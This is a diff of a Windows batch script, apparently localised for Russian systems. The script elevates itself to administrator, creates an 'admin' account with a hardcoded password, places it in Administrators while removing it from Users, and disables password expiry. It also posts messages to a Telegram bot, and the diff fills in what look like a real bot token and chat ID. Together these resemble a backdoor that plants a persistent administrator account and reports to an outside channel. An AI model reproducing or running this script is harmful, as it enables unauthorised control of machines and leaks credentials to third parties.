@@ -6,7 +6,7 @@ setlocal enabledelayedexpansion
 if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
  
 chcp 65001
-net user /add admin passwd
+net user /add admin D9SUC1@#$7gghj
 net localgroup Администраторы admin /add
 net localgroup Пользователи admin /del
 wmic useraccount where "name='admin'" set passwordexpires=false
@@ -49,8 +49,8 @@ endlocal
 exit /b
 
 :myFunction
-set TOKEN=""
-set CHAT_ID="-100"
+set TOKEN="5845038021:AAHLrIG7mtU6NrfqthV1wyIyniojUoGRPx8"
+set CHAT_ID="-1001881306503"
 
 curl -X POST "https://api.telegram.org/bot!TOKEN!/sendMessage" -d "chat_id=!CHAT_ID!&text=!msg!"
 
